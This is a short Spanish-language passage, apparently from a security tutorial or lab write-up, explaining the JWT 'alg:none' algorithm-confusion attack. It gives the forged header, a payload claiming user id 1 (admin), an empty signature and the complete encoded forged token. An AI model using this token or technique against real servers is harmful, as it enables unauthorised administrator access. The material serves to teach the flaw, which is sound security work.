## El servidor elige el algoritmo segun la cabecera del token (alg-confusion).
## Un atacante forja un token con alg:none, SIN conocer la clave secreta.

## Paso 1. Forjar el token (header alg:none, payload user.id=1 = admin)
   header  = {"alg":"none","typ":"JWT"}
   payload = {"user":{"id":1}}
   firma   = (vacia)
   token   = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjp7ImlkIjoxfX0.
